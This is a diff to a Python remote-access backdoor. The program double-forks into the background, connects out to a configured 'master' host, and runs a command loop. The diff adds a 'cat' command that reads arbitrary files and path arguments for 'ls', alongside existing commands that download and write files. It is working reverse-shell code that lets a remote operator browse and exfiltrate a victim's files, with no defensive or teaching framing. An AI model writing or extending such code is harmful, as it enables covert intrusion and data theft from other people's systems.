@@ -78,11 +78,19 @@ def cmd_shell(objSocket, master_hostname, master_port):
         pl = False
         if cmd[:2] == "ls":
             res = ""
-            resp_list = os.listdir()
+            if len(cmd) > 2:
+                path = cmd[3:]
+            else:
+                path = "."
+            resp_list = os.listdir(path)
             for resp in resp_list:
                 res += resp + 4*" "
         elif cmd[:3] == "pwd":
             res = str(os.getcwd())
+        elif cmd[:3] == "cat":
+            with open(cmd[3:], "r") as fp:
+                data = fp.read()
+            res += data
         elif cmd[:2] == "dl":
             #cmd_example = "dl note.txt" so cmd_example[2] == " "
             filepath = cmd[3:]
@@ -114,26 +122,23 @@ def cmd_shell(objSocket, master_hostname, master_port):
                 fp.write(data)
 
 def bootstrap(master_hostname, master_port):
-    try:
-        objSocket = socket.socket()
-    except socket.error:
-        # error creating socket
-        sys.exit(0)
-
-    objSocket.connect((master_hostname, master_port))
-
-    cmd_shell(objSocket, master_hostname, master_port)
-
-
-def main():
-    master_hostname, master_port = get_configs()
-    
     pid = os.fork()
     if pid == 0:
         pid2 = os.fork()
         if pid2 == 0:
-            bootstrap(master_hostname, master_port)
-    sys.exit(0)
+            try:
+                objSocket = socket.socket()
+            except socket.error:
+                # error creating socket
+                bootstrap(master_hostname, master_port)
+            objSocket.connect((master_hostname, master_port))
+            cmd_shell(objSocket, master_hostname, master_port)
+
+
+def main():
+    master_hostname, master_port = get_configs()
+    bootstrap(master_hostname, master_port)
+    return 0
 
 if __name__ == "__main__":
     main()
